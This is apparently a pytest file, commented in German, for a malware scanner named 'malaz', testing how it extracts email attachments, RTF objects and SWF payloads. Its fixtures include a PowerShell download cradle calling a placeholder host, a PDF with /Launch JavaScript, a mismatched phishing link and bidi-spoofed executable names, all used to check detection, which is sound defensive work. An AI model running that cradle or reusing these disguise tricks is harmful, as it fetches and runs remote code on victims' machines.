"""Tests for email attachment extraction (.eml / .msg), RTF objects and SWF."""

import io
import os
import tempfile
import time
from contextlib import suppress
from pathlib import Path

import pytest

from malaz import config
from malaz.analysis.clamav import ClamAVScanner
from malaz.analysis.windows_av import WindowsDefenderScanner
from malaz.core import rtf_extract
from malaz.core.archive import BUDGET_STOP_PREFIX
from malaz.core.dispatcher import Dispatcher
from malaz.core.email_extract import iter_email_attachments
from malaz.core.rtf_extract import _container_label, iter_rtf_objects
from malaz.core.swf_extract import iter_swf_payloads
from malaz.models import RiskLevel


def _eml(attachments: list[tuple[str, bytes]], body: str = "Hallo Welt") -> bytes:
    """Build a multipart .eml with the given (filename, payload) attachments."""
    import email.message
    import email.policy

    msg = email.message.EmailMessage(policy=email.policy.default)
    msg["From"] = "a@example.com"
    msg["To"] = "b@example.com"
    msg["Subject"] = "Test"
    msg["Message-ID"] = "<test-1@example.com>"
    msg.set_content(body)
    for _i, (filename, payload) in enumerate(attachments):
        part = email.message.EmailMessage(policy=email.policy.default)
        part.add_header("Content-Type", "application/octet-stream", name=filename)
        part.add_header("Content-Disposition", "attachment", filename=filename)
        part.set_content(
            payload,
            maintype="application",
            subtype="octet-stream",
            disposition="attachment",
            filename=filename,
        )
        msg.add_attachment(payload, maintype="application",
                           subtype="octet-stream", filename=filename)
    return msg.as_bytes()


def test_eml_attachments_extracted():
    data = _eml([("evil.pdf", b"%PDF-1.7\n/Launch\n%%EOF"), ("note.txt", b"hi")])
    members = list(iter_email_attachments(data, "eml"))
    by_name = {name: payload for name, payload, err in members if err is None}
    assert by_name["evil.pdf"] == b"%PDF-1.7\n/Launch\n%%EOF"
    assert by_name["note.txt"] == b"hi"
    assert all(err is None for _, _, err in members)


def test_eml_without_attachments_yields_nothing():
    data = _eml([])
    assert list(iter_email_attachments(data, "eml")) == []


def test_eml_corrupt_degrades():
    members = list(iter_email_attachments(b"kein email format", "eml"))
    # Parsing garbage yields no attachments, no crash.
    assert members == []


def test_eml_attachment_budget(monkeypatch):
    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 8)
    data = _eml([("big.bin", b"x" * 100)])
    members = list(iter_email_attachments(data, "eml"))
    assert len(members) == 1
    name, payload, err = members[0]
    assert name == "big.bin"
    assert payload == b""
    assert err is not None and "zu groß" in err


def test_eml_forged_content_length_does_not_block_the_scan(monkeypatch):
    """``Content-Length`` ist kein MIME-Header und darf nichts verhindern.

    Regression BUG-066: ``Content-Length: 1000000000000`` neben einem 20-Byte-
    MZ liess den Anhang "laut Header zu groß" werden — die Nutzlast wurde nie
    dekodiert und im Bericht stand eine Groesse, die niemand gemessen hat.
    """
    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 1024)
    payload = b"MZ" + b"\x00" * 18
    raw = (
        b"From: a@example.com\r\nTo: b@example.com\r\n"
        b"Content-Type: application/octet-stream\r\n"
        b"Content-Disposition: attachment; filename=small.bin\r\n"
        b"Content-Length: 1000000000000\r\n\r\n" + payload + b"\r\n"
    )
    members = list(iter_email_attachments(raw, "eml"))
    assert len(members) == 1
    name, data, err = members[0]
    assert name == "small.bin"
    assert err is None, err
    # Der Teil geht bis zum Dateiende; die abschliessende CRLF gehoert dazu.
    assert data == payload + b"\r\n"



def test_base64_attachment_without_length_header_is_bounded(monkeypatch):
    import base64

    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 8)
    encoded = base64.b64encode(b"x" * 100)
    raw = (
        b"From: a@example.com\r\n"
        b"Content-Type: application/octet-stream\r\n"
        b"Content-Transfer-Encoding: base64\r\n"
        b"Content-Disposition: attachment; filename=big.bin\r\n\r\n"
        + encoded
        + b"\r\n"
    )
    members = list(iter_email_attachments(raw, "eml"))
    assert len(members) == 1
    assert members[0][1] == b""
    assert "Base64" in (members[0][2] or "")

def test_eml_attachment_total_budget_is_reported_not_silent(monkeypatch):
    """TEST-025: das Gesamtbudget darf einen Anhang nicht STILL verwerfen.

    Vorher pruefte der Test nur ``len(ok) == 1``; mit
    ``MAX_UNCOMPRESSED_SIZE=12`` fehlte ``b.bin`` ohne jede Notiz — fuer den
    Dispatcher nicht von "keine weiteren Anhänge" zu unterscheiden.
    """
    monkeypatch.setattr(config, "MAX_UNCOMPRESSED_SIZE", 12)
    data = _eml([("a.bin", b"x" * 10), ("b.bin", b"y" * 10)])
    members = list(iter_email_attachments(data, "eml"))
    ok = [m for m in members if m[2] is None]
    assert len(ok) == 1
    notes = [m for m in members if m[2] is not None]
    assert len(notes) == 1, members
    assert notes[0][0] == "", "die Notiz darf nicht wie ein Anhang aussehen"
    assert "NICHT analysiert" in notes[0][2]
    assert "Gesamtlimit" in notes[0][2]


def test_eml_path_traversal_name_is_basename():
    # A hostile filename must only be used as a display name.
    data = _eml([("..\\..\\evil.exe", b"x")])
    members = list(iter_email_attachments(data, "eml"))
    assert members[0][0] == "evil.exe"


# -- .msg via a hand-built compound file ------------------------------------- #

def _build_msg_cfb(
    attachments: list[tuple[str, bytes]],
    name_stream: str = "__substg1.0_3704000A",
    properties: dict[str, str] | None = None,
    nesting: int = 0,
) -> bytes:
    """Build a minimal Outlook-style CFB with __attach_* storages.

    Layout: header, FAT sector(s), directory sector(s), MiniFAT sector, one
    MiniStream sector (all attachment streams are < 4096 bytes and therefore
    live in the mini stream per the CFB spec). olefile must be able to walk
    the directory and read the payload streams. ``name_stream`` selects the
    PidTagAttachLongFilename/Filename variant Outlook actually writes
    (``3704001F`` = Unicode, ``3704001E`` = ANSI, ``3704000A`` = short name).

    ``properties`` maps a full property-stream name (``__substg1.0_0037001F``)
    to its text value and adds it at the ROOT level, together with the
    ``__properties_version1.0`` table every real message carries. Values are
    encoded the way their stream name announces: ``001F`` = UTF-16LE,
    otherwise the ANSI byte encoding.

    ``nesting`` chains that many empty storages (one 128-byte directory entry
    each) under the root — the depth an attacker controls with pure bytes and
    the reason the walk needs headroom at all.
    """
    import struct

    MINI = 64  # mini sector size

    # Directory ids: root=0, then the root-level property streams, then per
    # attachment: storage, name stream, data stream. Links: storage child =
    # name stream; name stream's RIGHT sibling = data stream; every root-level
    # entry is a RIGHT sibling of the previous one.
    dir_entries: list[tuple[str, int, int, int, int, bytes]] = []
    # (name, type, child id, right sibling id, mini sector start, content)
    dir_entries.append(("Root Entry", 5, 0, 0, 0, b""))  # child patched below

    ministream = b""
    minifat: list[int] = []

    def _alloc_mini(content: bytes) -> int:
        """Append ``content`` to the mini stream; return its mini sector."""
        nonlocal ministream, minifat
        start = len(ministream) // MINI
        n_mini = max(1, (len(content) + MINI - 1) // MINI)
        ministream += content.ljust(n_mini * MINI, b"\x00")
        for j in range(n_mini):
            minifat.append(start + j + 1 if j + 1 < n_mini else 0xFFFFFFFE)
        return start

    def _add_stream(stream_name: str, content: bytes) -> int:
        mini = _alloc_mini(content)
        dir_entries.append((stream_name, 2, 0, 0, mini, content))
        return len(dir_entries) - 1

    root_children: list[int] = []
    if properties is not None:
        root_children.append(_add_stream("__properties_version1.0", b"\x00" * 32))
        for stream_name, value in properties.items():
            text = value + "\x00"
            if stream_name.endswith("001F"):
                encoded = text.encode("utf-16-le")  # PT_UNICODE
            elif stream_name.endswith("0102"):
                encoded = text.encode("utf-8")  # PT_BINARY (PidTagHtml)
            else:
                encoded = text.encode("latin-1")  # PT_STRING8
            root_children.append(_add_stream(stream_name, encoded))

    for idx, (fname, payload) in enumerate(attachments, start=1):
        storage_id = len(dir_entries)
        dir_entries.append((f"__attach_v1.0_{idx:08X}", 1, 0, 0, 0, b""))
        if name_stream.endswith("1F"):
            name_content = (fname + "\x00").encode("utf-16-le")
        else:
            name_content = (fname + "\x00").encode("latin-1")
        name_id = _add_stream(name_stream, name_content)
        data_id = _add_stream("__substg1.0_37010102", payload)
        # wire up: storage child = name stream; name's right sibling = data
        dir_entries[storage_id] = (
            dir_entries[storage_id][0], 1, name_id, 0, 0, b"")
        entry = dir_entries[name_id]
        dir_entries[name_id] = (entry[0], 2, 0, data_id, entry[4], entry[5])
        root_children.append(storage_id)

    # The attacker-controlled depth: a chain of empty storages, each the CHILD
    # of the previous one (that is what ``build_storage_tree`` recurses into).
    # It becomes the last root child, so the sibling wiring below covers it.
    if nesting:
        parent_id: int | None = None
        for i in range(nesting):
            sid = len(dir_entries)
            dir_entries.append((f"C{i:04d}", 1, 0, 0, 0, b""))
            if parent_id is None:
                root_children.append(sid)
            else:
                entry = dir_entries[parent_id]
                dir_entries[parent_id] = (
                    entry[0], 1, sid, entry[3], entry[4], entry[5]
                )
            parent_id = sid

    for pos, child_id in enumerate(root_children):
        entry = dir_entries[child_id]
        right = root_children[pos + 1] if pos + 1 < len(root_children) else 0
        dir_entries[child_id] = (
            entry[0], entry[1], entry[2], right, entry[4], entry[5]
        )
    # Sector layout: FAT sector(s), then the directory (chained), then the
    # MiniFAT, then the MiniStream. The directory holds four entries per
    # 512-byte sector, so the root's mini-stream start sector is COMPUTED —
    # with property streams it is no longer sector 3, and a deep tree needs
    # more than one FAT sector (each FAT sector links 127 others: its own cell
    # is FATSECT).
    n_dir_sectors = max(1, -(-len(dir_entries) * 128 // 512))
    n_mini_sectors = max(1, -(-len(ministream) // 512))
    core_sectors = n_dir_sectors + 1 + n_mini_sectors  # + the MiniFAT sector
    fat_count = max(1, -(-core_sectors // 127))
    dir_first = fat_count
    minifat_sector = dir_first + n_dir_sectors
    ministream_first = minifat_sector + 1
    dir_entries[0] = (
        "Root Entry", 5, root_children[0] if root_children else 1, 0,
        ministream_first, ministream,
    )

    # Serialize directory entries (128 bytes each, UTF-16LE names).
    dir_data = b""
    for name, etype, child, right_sibling, mini_start, content in dir_entries:
        name_bytes = name.encode("utf-16-le")[:64]
        entry = (
            name_bytes.ljust(64, b"\x00")
            + struct.pack("<H", len(name) * 2 + 2)  # length incl. NUL
            + struct.pack("<B", etype)
            + b"\x00"  # color
            + struct.pack("<I", 0xFFFFFFFF)  # left sibling
            + struct.pack("<I", right_sibling)  # right sibling
            + struct.pack("<I", child)
            + b"\x00" * 16  # CLSID
            + struct.pack("<I", 0)  # state
            + b"\x00" * 16  # creation + modification times (8+8)
            + struct.pack("<I", mini_start)  # start sector (mini stream)
            + struct.pack("<Q", len(content))  # size (last field, 128 total)
        )
        dir_data += entry

    def _pad(data: bytes, fill: bytes) -> bytes:
        """Pad to a whole number of 512-byte sectors (at least one)."""
        n_sectors = max(1, -(-len(data) // 512))
        return data.ljust(n_sectors * 512, fill)

    # The directory can span several sectors; pad it to the computed count.
    dir_data = _pad(dir_data, b"\x00")
    assert len(dir_data) == n_dir_sectors * 512

    minifat_data = _pad(b"".join(struct.pack("<I", e) for e in minifat), b"\xff")
    ministream_data = _pad(ministream, b"\x00")

    header = (
        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"  # magic
        + b"\x00" * 16                        # CLSID (bytes 8..23)
        + struct.pack("<HH", 0x003E, 0x0003)  # minor, major version
        + struct.pack("<H", 0xFFFE)           # byte order
        + struct.pack("<HH", 9, 6)            # sector/mini-sector shift
        + struct.pack("<H", 0)                # reserved1 (34-35)
        + struct.pack("<I", 0)                # reserved2 (36-39)
        + struct.pack("<I", 0)                # number of directory sectors
                                              # (MUST be 0 for v3 files; the
                                              # chain is walked instead)
        + struct.pack("<I", fat_count)        # number of FAT sectors
        + struct.pack("<I", dir_first)        # first directory sector
        + struct.pack("<I", 0)                # transaction
        + struct.pack("<I", 0x1000)           # mini stream cutoff
        + struct.pack("<I", minifat_sector)   # first mini FAT sector
        + struct.pack("<I", 1)                # number of mini FAT sectors
        + struct.pack("<I", 0xFFFFFFFE)       # first DIFAT sector (none)
        + struct.pack("<I", 0)                # number of DIFAT sectors
        # DIFAT: the FAT sector ids themselves (they sit at the file start),
        # FREESECT for the rest. Up to 109 entries fit in the header, which is
        # far beyond what this fixture can need.
        + b"".join(
            struct.pack("<I", i if i < fat_count else 0xFFFFFFFF)
            for i in range(109)
        )
    )
    assert len(header) == 512

    # FAT: the FAT sectors themselves, then the directory (chained), then the
    # MiniFAT, then the MiniStream (chained as well — the mini stream can
    # exceed one sector once enough / large property streams are stored).
    fat_cells = [0xFFFFFFFD] * fat_count
    for i in range(n_dir_sectors):
        fat_cells.append(
            dir_first + i + 1 if i + 1 < n_dir_sectors else 0xFFFFFFFE
        )
    fat_cells.append(0xFFFFFFFE)  # MiniFAT
    for i in range(n_mini_sectors):
        fat_cells.append(
            ministream_first + i + 1 if i + 1 < n_mini_sectors else 0xFFFFFFFE
        )
    fat = b"".join(struct.pack("<I", e) for e in fat_cells).ljust(
        fat_count * 512, b"\xff"
    )

    return header + fat + dir_data + minifat_data + ministream_data


def test_msg_attachments_extracted():
    cfb = _build_msg_cfb([("evil.doc", b"\xd0\xcf\x11\xe0" + b"x" * 100)])
    members = list(iter_email_attachments(cfb, "msg"))
    assert len(members) == 1
    name, payload, err = members[0]
    assert err is None
    assert name == "evil.doc"
    assert payload == b"\xd0\xcf\x11\xe0" + b"x" * 100


def test_msg_corrupt_degrades():
    members = list(iter_email_attachments(b"kein CFB", "msg"))
    assert len(members) == 1
    assert members[0][2] is not None  # error entry, no crash


def test_msg_without_attachments():
    # A valid CFB without __attach_ storages yields nothing.
    cfb = _build_msg_cfb([])
    assert list(iter_email_attachments(cfb, "msg")) == []


def test_msg_unicode_and_ansi_name_streams():
    for name_stream in ("__substg1.0_3704001F", "__substg1.0_3704001E"):
        cfb = _build_msg_cfb(
            [("Ärger_umlaut.doc", b"\xd0\xcf\x11\xe0" + b"x" * 32)],
            name_stream=name_stream,
        )
        members = list(iter_email_attachments(cfb, "msg"))
        assert len(members) == 1
        name, payload, err = members[0]
        assert err is None, name_stream
        assert name == "Ärger_umlaut.doc", name_stream
        assert payload.startswith(b"\xd0\xcf\x11\xe0")


# -- .msg mail preview (mail_view) ------------------------------------------- #

# Root-level property streams of a plain message: subject, sender, recipient,
# text body and an HTML body. The names are the real PidTag ids
# (0037 = Subject, 0C1A = SenderName, 5D01 = SenderSmtpAddress, 0E04 =
# DisplayTo, 1000 = Body, 1013 = Html).
_MSG_PROPS = {
    "__substg1.0_0037001F": "Rechnung offen",
    "__substg1.0_0C1A001F": "Buchhaltung Muster GmbH",
    "__substg1.0_5D01001F": "buchhaltung@example.invalid",
    "__substg1.0_0E04001F": "kunde@example.invalid",
    "__substg1.0_1000001F": "Guten Tag,\n\nanbei die Rechnung.\n",
    "__substg1.0_10130102": (
        '<a href="http://198.51.100.7/zahlung">https://www.paypal.com/anmeldung</a>'
    ),
}


def test_msg_preview_shows_subject_body_and_attachments(tmp_path):
    """A .msg must be READ, not only unpacked.

    ``parse_mail`` never sees a .msg — it is an OLE container, so the MIME path
    is never taken and the panel showed the office findings while the mail
    itself stayed invisible. The preview goes through the SAME renderer as the
    .eml path, so masking and link annotation apply unchanged.
    """
    from malaz.core.mail_view import render_msg

    cfb = _build_msg_cfb([("Rechnung.pdf", b"%PDF-1.7\n%%EOF")], properties=_MSG_PROPS)

    text = render_msg(cfb)
    assert "Betreff: Rechnung offen" in text
    assert "Buchhaltung Muster GmbH <buchhaltung@example.invalid>" in text
    assert "An: kunde@example.invalid" in text
    assert "anbei die Rechnung." in text
    assert "Rechnung.pdf" in text
    # The link annotations come from extract_links over BOTH bodies, exactly as
    # for an .eml — the anchor in the HTML part is the classic mismatch carrier.
    assert "Linktext nennt anderen Host" in text
    assert "IP-Adresse statt Name" in text

    # …and the preview reaches the ScanResult the GUI reads.
    path = tmp_path / "mail.msg"
    path.write_bytes(cfb)
    dispatcher = Dispatcher(
        av_scanner=WindowsDefenderScanner(enabled=False),
        clam_scanner=ClamAVScanner(enabled=False),
    )
    result = dispatcher.scan_path(path)
    assert result.detected_type == "ole"
    assert "Betreff: Rechnung offen" in result.mail_preview, "kein Preview am Ergebnis"
    assert [c.path for c in result.children] == ["Rechnung.pdf"]

    # …and the details panel shows it (the panel is plain text; the preview is
    # part of _format_detail so it also appears for nested results).
    from malaz.gui.main_window import _format_detail

    panel = _format_detail(result)
    assert "Betreff: Rechnung offen" in panel
    assert "anbei die Rechnung." in panel


def test_msg_attached_to_an_eml_gets_a_preview(tmp_path):
    """A forwarded .msg is where a forwarded phish actually hides.

    The attachment path keeps the file name, so the .msg is detected as an
    email container at depth 1 and previewed like a top-level mail.
    """
    import email.message
    import email.policy

    from malaz.core.mail_view import render_msg
    from malaz.gui.main_window import _format_detail

    inner = _build_msg_cfb(
        [("Rechnung.pdf", b"%PDF-1.7\n%%EOF")],
        properties={
            "__substg1.0_0037001F": "Angehaengte Nachricht",
            "__substg1.0_1000001F": "Body der angehaengten Nachricht\n",
        },
    )
    assert "Betreff: Angehaengte Nachricht" in render_msg(inner)

    outer = email.message.EmailMessage(policy=email.policy.default)
    outer["From"] = "a@b.invalid"
    outer["To"] = "c@d.invalid"
    outer["Subject"] = "Weitergeleitet"
    outer.set_content("Siehe Anhang.")
    outer.add_attachment(
        inner, maintype="application", subtype="octet-stream",
        filename="weitergeleitet.msg",
    )
    names = [name for name, _payload, err in iter_email_attachments(outer.as_bytes(), "eml")]
    assert names == ["weitergeleitet.msg"]

    path = tmp_path / "outer.eml"
    path.write_bytes(outer.as_bytes())
    dispatcher = Dispatcher(
        av_scanner=WindowsDefenderScanner(enabled=False),
        clam_scanner=ClamAVScanner(enabled=False),
    )
    result = dispatcher.scan_path(path)

    child = result.children[0]
    assert child.detected_type == "ole"
    assert "Betreff: Angehaengte Nachricht" in child.mail_preview
    assert "Angehaengte Nachricht" in _format_detail(result)


def test_msg_preview_never_prints_the_html_body():
    """PidTagHtml is attacker-controlled: links are extracted, markup is not shown."""
    from malaz.core.mail_view import parse_msg, render_msg

    cfb = _build_msg_cfb(
        [],
        properties={
            "__substg1.0_1000001F": "harmloser Text",
            "__substg1.0_10130102": (
                '<html><body onload="alert(1)">Grüße<script>x=1</script>'
                '<img src="http://tracker.example.invalid/p.gif"></body></html>'
            ),
        },
    )
    # The HTML stream is decoded (UTF-8, as the binary property carries it) …
    assert "Grüße" in parse_msg(cfb).html_body

    # … but only its links reach the panel, never its markup.
    text = render_msg(cfb)
    assert "harmloser Text" in text
    for marker in ("<script", "onload", "<img", "<html", "alert("):
        assert marker not in text, f"HTML-Rest im Preview: {marker}"
    # Der Tracker erscheint nur als extrahierte URL — genau das ist gewollt.
    assert "http://tracker.example.invalid/p.gif" in text


def test_msg_preview_masks_bidi_in_fields():
    """The masking must cover .msg fields, not only .eml headers.

    A bidi override in a subject or attachment name is displayed by Qt as a
    DIFFERENT string than the one stored (see security.escaping), so the
    extraction path may not bypass mask_invisible.
    """
    from malaz.core.mail_view import render_msg

    cfb = _build_msg_cfb(
        [("Rechnung\u202efdp.exe", b"MZ")],
        name_stream="__substg1.0_3704001F",  # Unicode stream, as Outlook writes it
        properties={
            "__substg1.0_0037001F": "Rechnung\u202efdp.exe",
            "__substg1.0_1000001F": "Body\u202emit Trick",
        },
    )
    text = render_msg(cfb)
    assert "\u202e" not in text, "das Bidi-Zeichen wird roh ausgegeben"
    assert text.count("\\u202e") >= 3, "Betreff, Body und Anhangsname maskiert"


def test_msg_preview_empty_when_not_a_message():
    """No fake mail: a renamed .doc and plain garbage both yield no preview.

    The property table is what separates a message from any other compound
    file; without the check a renamed document would render as an "empty mail"
    — which reads as "nothing found".
    """
    from malaz.core.mail_view import render_msg

    assert render_msg(b"kein CFB") == ""
    # A valid CFB with an attachment but WITHOUT the property table: not a mail.
    assert render_msg(_build_msg_cfb([("a.bin", b"x" * 32)])) == ""


# -- RTF objects -------------------------------------------------------------- #

def _rtf_with_objdata(payload: bytes) -> bytes:
    return b"{\\rtf1\\object\\objdata " + payload.hex().encode() + b" }"


def test_rtf_ole_object_extracted():
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64
    members = list(iter_rtf_objects(_rtf_with_objdata(ole)))
    assert len(members) == 1
    name, payload, err = members[0]
    assert err is None
    assert name.startswith("embedded_ole_")
    assert payload.startswith(b"\xd0\xcf\x11\xe0")


def test_rtf_non_container_blob_ignored():
    # Hex data that is not a container magic must not be yielded.
    members = list(iter_rtf_objects(_rtf_with_objdata(b"hello world")))
    assert members == []


def test_rtf_zip_object_extracted():
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("a.txt", b"x")
    members = list(iter_rtf_objects(_rtf_with_objdata(buf.getvalue())))
    assert any(m[0].startswith("embedded_zip_") for m in members)


def test_rtf_oversized_object_errors(monkeypatch):
    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 8)
    members = list(iter_rtf_objects(_rtf_with_objdata(b"x" * 100)))
    assert len(members) == 1
    assert members[0][2] is not None and "zu groß" in members[0][2]


def test_rtf_invalid_hex_ignored():
    members = list(iter_rtf_objects(b"{\\rtf1\\objdata not-hex-at-all }"))
    assert members == []


def test_container_label():
    assert _container_label(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1rest") == "ole"
    assert _container_label(b"PK\x03\x04rest") == "zip"
    assert _container_label(b"no magic here") is None


# Befund: ``iter_rtf_objects`` brach an beiden Limits STILL ab (``return`` ohne
# ``yield``) — fuer den Dispatcher nicht von "keine eingebetteten Objekte" zu
# unterscheiden. Zusaetzlich zaehlte ``processed`` JEDEN Regex-Treffer, auch die
# verworfenen: ``\objdata 00`` kostet 12 Byte, dekodiert zu einem Byte ohne
# Container-Magic und belegte trotzdem einen der 10 000 Plaetze. Gemessen:
# 10 005 Attrappen vor einem echten eingebetteten Objekt drehten ROT 100 in
# GRUEN 0 — die Nutzlast wurde nie dekodiert.

_OLE_BLOB = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64


def _rtf_with_objects(*blobs: bytes, decoys: int = 0) -> bytes:
    parts = [b"\\objdata 00 "] * decoys + [b"\\objdata " + b.hex().encode() for b in blobs]
    return b"{\\rtf1\\ansi " + b" ".join(parts) + b" }"


def test_rtf_decoys_do_not_consume_the_object_limit(monkeypatch):
    monkeypatch.setattr(rtf_extract, "_MAX_OBJECTS", 3)
    members = list(iter_rtf_objects(_rtf_with_objects(_OLE_BLOB, decoys=10)))
    assert [n for n, _p, _e in members if n], members


def test_rtf_object_limit_is_reported_not_silent(monkeypatch):
    monkeypatch.setattr(rtf_extract, "_MAX_OBJECTS", 2)
    members = list(iter_rtf_objects(_rtf_with_objects(*[_OLE_BLOB] * 3)))
    assert len([n for n, _p, _e in members if n]) == 2, members
    notes = [e for n, _p, e in members if not n and e]
    assert len(notes) == 1, members
    assert notes[0].startswith(BUDGET_STOP_PREFIX)
    assert "NICHT analysiert" in notes[0]


def test_rtf_total_volume_limit_is_reported_not_silent(monkeypatch):
    monkeypatch.setattr(config, "MAX_UNCOMPRESSED_SIZE", 8)
    tiny = b"PK\x03\x04\x00\x00"  # 6 Bytes, gueltige Container-Magic
    members = list(iter_rtf_objects(_rtf_with_objects(tiny, tiny)))
    assert len([n for n, _p, _e in members if n]) == 1, members
    notes = [e for n, _p, e in members if not n and e]
    assert len(notes) == 1, members
    assert notes[0].startswith(BUDGET_STOP_PREFIX)


# -- end-to-end through the dispatcher --------------------------------------- #

@pytest.fixture()
def dispatcher():
    # ClamAV explizit AUS, wie in den anderen Fixtures dieser Datei: ohne das
    # faellt der Dispatcher auf ClamAVScanner() mit config.CLAMAV_ENABLED=True
    # zurueck und jeder Scan ruft echtes ClamAV auf. Gemessen: 198 s statt 4 s
    # fuer diese Datei, abhaengig davon, ob gerade ein clamd lief — dieselbe
    # Nicht-Determinismus-Klasse, die conftest fuer die Blocklisten behebt.
    return Dispatcher(
        av_scanner=WindowsDefenderScanner(enabled=False),
        clam_scanner=ClamAVScanner(enabled=False),
    )


def _scan(dispatcher, data: bytes, suffix: str):
    import os
    import tempfile

    fd, path = tempfile.mkstemp(suffix=suffix)
    os.write(fd, data)
    os.close(fd)
    try:
        return dispatcher.scan_path(path)
    finally:
        os.unlink(path)


def test_eml_with_malicious_attachment_is_red(dispatcher):
    data = _eml([("evil.pdf", b"%PDF-1.7\n/Launch /JavaScript\n%%EOF")])
    r = _scan(dispatcher, data, ".eml")
    assert r.detected_type == "eml"
    assert r.risk_level == RiskLevel.RED
    assert any(c.display_name == "evil.pdf" for c in r.children)


def test_rtf_with_malicious_ole_is_red(dispatcher):
    # A minimal RTF embedding an OLE blob containing VBA-ish content cannot be
    # parsed by olevba here, but the recursion itself must run and the child
    # must be detected as OLE.
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 128
    r = _scan(dispatcher, _rtf_with_objdata(ole), ".rtf")
    assert r.detected_type == "rtf"
    assert r.error is None
    assert len(r.children) == 1
    assert r.children[0].detected_type == "ole"


_PS_CRADLE = (
    b"powershell -nop -w hidden -enc SQBFAFgA\r\n"
    b"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/x.ps1')"
)


def _payload_zip() -> bytes:
    """A ZIP whose member is a PowerShell download cradle."""
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("payload.ps1", _PS_CRADLE)
    return buf.getvalue()


def test_rtf_decoy_objects_do_not_hide_the_real_object(dispatcher, monkeypatch):
    """Befund end-to-end: Attrappen durften das Objekt nicht verschwinden lassen.

    Gemessen vorher: dasselbe RTF mit dem Objekt an erster Stelle ROT 100,
    mit 10 005 Attrappen davor GRUEN 0 — kein Kind, keine Notiz.
    """
    monkeypatch.setattr(rtf_extract, "_MAX_OBJECTS", 3)
    blob = _payload_zip()
    first = _rtf_with_objdata(blob)
    behind = _rtf_with_objects(blob, decoys=10)

    r_first = _scan(dispatcher, first, ".rtf")
    r_behind = _scan(dispatcher, behind, ".rtf")

    assert r_first.children, "ohne Attrappen muss die Nutzlast gescannt werden"
    assert [c.display_name for c in r_behind.children] == [
        c.display_name for c in r_first.children
    ], "die Attrappen duerfen den Fund nicht veraendern"
    assert r_behind.risk_level != RiskLevel.GREEN


def test_rtf_object_limit_reaches_the_verdict(dispatcher, monkeypatch):
    """Der Limit-Abbruch muss als Notiz mit Gewicht >= 25 ankommen."""
    monkeypatch.setattr(rtf_extract, "_MAX_OBJECTS", 2)
    r = _scan(dispatcher, _rtf_with_objects(*[_OLE_BLOB] * 3), ".rtf")

    stop = [i for i in r.all_indicators() if i.rule_id == "ARCH_MEMBER_STOP"]
    assert stop, sorted({i.rule_id for i in r.all_indicators()})
    assert stop[0].weight >= 25
    assert r.risk_level != RiskLevel.GREEN

# -- SWF decompression ------------------------------------------------------- #

def test_swf_cws_decompressed():
    import zlib

    payload = b"FWS\x09" + b"\x00" * 10 + b"http://evil.example/x" * 3
    compressed = b"CWS" + b"\x09" + b"\x00" * 4 + zlib.compress(payload)
    members = list(iter_swf_payloads(compressed))
    assert len(members) == 1
    name, data, err = members[0]
    assert err is None
    assert name == "payload.swf"
    assert data == payload


def _real_zws(payload: bytes) -> bytes:
    """Ein ECHTES ZWS: 5 Byte LZMA-Properties + roher LZMA1-Strom.

    Die fruehere Fassung dieses Tests nahm ``lzma.compress(payload)`` — das ist
    ein XZ-Container, kein ZWS. Sie zertifizierte damit eine Faehigkeit, die
    fuer reale Dateien nicht existiert (Audit TEST-024). Schwanz ist
    ``lc=3/lp=0/pb=2`` + 64 KiB Dictionary, wie der SWF-Standard es schreibt.
    """
    import lzma

    filters = [
        {"id": lzma.FILTER_LZMA1, "dict_size": 1 << 16, "lc": 3, "lp": 0, "pb": 2}
    ]
    raw = lzma.compress(payload, format=lzma.FORMAT_RAW, filters=filters)
    return b"ZWS" + b"\x09" + b"\x00" * 4 + b"\x5d\x00\x00\x01\x00" + raw


def test_swf_real_zws_never_fakes_a_payload():
    """Reales ZWS: entweder dekodiert ODER eine sichtbare Fehlermeldung.

    Der Dekodierer benutzt ``lzma.FORMAT_AUTO`` und unterstuetzt den rohen
    LZMA1-Layout realer ZWS-Dateien derzeit NICHT. Das ist eine Luecke der
    Produktion (separat gemeldet), aber der Test darf sie nicht mehr als
    Erfolg ausgeben: ein leeres Ergebnis waere von "nichts zu analysieren"
    nicht zu unterscheiden.
    """
    payload = b"FWS\x09" + b"payload content"
    members = list(iter_swf_payloads(_real_zws(payload)))
    assert len(members) == 1, "weder Nutzlast noch Diagnose geliefert"
    name, data, err = members[0]
    if err is None:
        # Sobald die Produktion rohes LZMA1 beherrscht, muss das Ergebnis
        # stimmen — nicht nur "irgendetwas".
        assert name == "payload.swf" and data == payload
    else:
        assert "nicht lesbar" in err or "not supported" in err.lower(), err


def test_swf_xz_container_is_not_advertised_as_zws():
    """Der XZ-Container bleibt als Toleranz lesbar — aber nicht als ZWS-Beweis.

    ``lzma.compress`` erzeugt XZ; der Dekodierer akzeptiert das ueber
    ``FORMAT_AUTO``. Der Test steht hier nur, damit die Toleranz nicht
    versehentlich verloren geht; die reale ZWS-Aussage traegt er nicht.
    """
    import lzma

    payload = b"FWS\x09" + b"payload content"
    compressed = b"ZWS" + b"\x09" + b"\x00" * 4 + lzma.compress(payload)
    members = list(iter_swf_payloads(compressed))
    assert members and members[0][1] == payload


def test_swf_uncompressed_not_reextracted():
    assert list(iter_swf_payloads(b"FWS\x09" + b"\x00" * 20)) == []


def test_swf_corrupt_degrades():
    members = list(iter_swf_payloads(b"CWS\x09" + b"\x00" * 4 + b"kein zlib"))
    assert len(members) == 1
    assert members[0][2] is not None and "nicht lesbar" in members[0][2]


def test_swf_bomb_capped(monkeypatch):
    import zlib

    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 64)
    bomb = b"CWS\x09" + b"\x00" * 4 + zlib.compress(b"\x00" * 100000)
    members = list(iter_swf_payloads(bomb))
    assert members and "zu groß" in members[0][2]


